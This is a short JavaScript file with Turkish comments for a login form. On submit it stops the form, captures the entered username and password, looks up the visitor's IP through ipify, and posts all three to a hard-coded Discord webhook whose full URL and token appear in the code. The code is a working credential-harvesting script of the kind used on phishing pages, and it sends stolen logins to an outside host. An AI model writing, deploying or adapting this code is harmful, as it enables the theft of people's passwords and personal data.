document.addEventListener('DOMContentLoaded', function() {
    // HTML'deki form elementini seçiyoruz
    var loginForm = document.getElementById('login-form');

    // Form submit olduğunda tetiklenecek fonksiyonu tanımlıyoruz
    loginForm.addEventListener('submit', function(event) {
        event.preventDefault(); // Formun default submit işlemini engelliyoruz

        // Kullanıcı adı ve şifre değerlerini alıyoruz
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        // IP adresini almak için API isteğini yapıyoruz
        var ip = '';
        fetch('https://api.ipify.org/?format=json')
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                ip = data.ip;

                // Kullanıcı adı, şifre ve IP bilgilerini içeren nesneyi oluşturuyoruz
                var loginInfo = {
                    username: username,
                    password: password,
                    ip: ip
                };

                // Discord webhook'a gönderilecek mesaj nesnesini oluşturuyoruz
                var message = {
                    content: 'Login Information\nUsername: ' + loginInfo.username + '\nPassword: ' + loginInfo.password + '\nIP: ' + loginInfo.ip
                };

                // Discord webhook'a POST isteği yaparak mesajı gönderiyoruz
                var webhook = 'https://discord.com/api/webhooks/1210254216740872193/SeLUNOCU--C74bUsiY5GuUi9ikGXt7kFcpriZJUPQ29F2pYbI9IdnNCbN0USmi6emVg0'; // Burada kendi webhook bilgilerinizi eklemelisiniz
                fetch(webhook, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
            });
    });
});
